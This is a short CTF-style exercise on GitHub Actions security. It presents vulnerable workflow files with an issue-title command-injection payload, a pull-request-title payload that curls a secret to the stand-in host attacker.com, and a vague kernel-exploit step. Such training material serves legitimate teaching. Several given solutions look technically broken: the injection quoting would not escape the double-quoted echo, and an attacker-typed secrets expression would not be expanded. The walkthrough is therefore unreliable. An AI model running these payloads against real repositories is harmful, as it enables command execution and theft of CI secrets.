# Advanced Attack Scenario 10: GitHub Actions CTF-style challenge

This scenario is a CTF-style challenge that will test your knowledge of GitHub Actions security. The challenge consists of a series of progressively more difficult challenges, each of which involves a different vulnerability. To complete the challenge, you will need to find the flag at the end of each challenge.

## Challenge 1: Command Injection

**Description:**

The first challenge is a simple command injection vulnerability. You will need to find a way to execute arbitrary commands on the runner.

**Vulnerable Code:**

```yaml
name: Challenge 1
on:
  issues:
    types: [opened]
jobs:
  challenge1:
    runs-on: ubuntu-latest
    steps:
      - name: Challenge 1
        run: |
          echo "The flag is in a file called flag.txt"
          echo "Your input: ${{ github.event.issue.title }}"
```

**Hint:**

Try to use a shell command to read the contents of the `flag.txt` file.

**Solution:**

Create an issue with the title `'; cat flag.txt'`.

## Challenge 2: Secret Exfiltration

**Description:**

The second challenge is a secret exfiltration vulnerability. You will need to find a way to exfiltrate a secret from the workflow.

**Vulnerable Code:**

```yaml
name: Challenge 2
on:
  pull_request_target:
    types: [opened]
jobs:
  challenge2:
    runs-on: ubuntu-latest
    steps:
      - name: Challenge 2
        run: |
          echo "The flag is in a secret called FLAG"
          echo "Your input: ${{ github.event.pull_request.title }}"
```

**Hint:**

Try to use a shell command to exfiltrate the secret to a third-party service.

**Solution:**

Create a pull request with the title `'; curl http://attacker.com/?flag=${{ secrets.FLAG }}'`.

## Challenge 3: Privilege Escalation

**Description:**

The third challenge is a privilege escalation vulnerability. You will need to find a way to escalate your privileges on the runner.

**Vulnerable Code:**

```yaml
name: Challenge 3
on:
  push:
    branches: [ main ]
jobs:
  challenge3:
    runs-on: self-hosted
    steps:
      - name: Challenge 3
        run: |
          echo "The flag is in the /root directory"
```

**Hint:**

Try to use a kernel exploit to gain root access to the host machine.

**Solution:**

Use a kernel exploit to gain root access to the host machine and then read the contents of the `/root/flag.txt` file.
